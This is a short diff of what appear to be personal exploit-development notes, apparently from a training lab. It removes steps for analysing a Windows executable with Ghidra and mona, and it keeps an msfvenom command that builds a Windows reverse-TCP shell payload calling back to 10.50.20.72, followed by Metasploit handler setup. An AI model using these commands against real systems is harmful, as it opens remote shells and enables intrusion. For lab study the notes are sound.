@@ -96,14 +96,6 @@ mem2:
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
           ###EXPLOIT DEVELOPEMENT###
-(WINDOWS)  
-
-RUN .EXE AND SEE THAT IT OPENS PORT, USE LIN_OPS TO CONNECT TO PORT AND INTERACT WITH EXE
-USE GHIDRA TO PERFROM ANALYSIS OF .EXE, FIND VULNERABLE FUNCTION
-
-!mona modules
-!mona jump -r esp -m "essfunc.dll"
-Window -> Log Data Drop Down
 msfvenom -p windows/shell/reverse_tcp lhost=10.50.20.72 lport=21001 -b "\x00" -f python           #USE PORT 21001 WHEN USING MULTI/HANDLER
 msfconsole
 use multi/hander
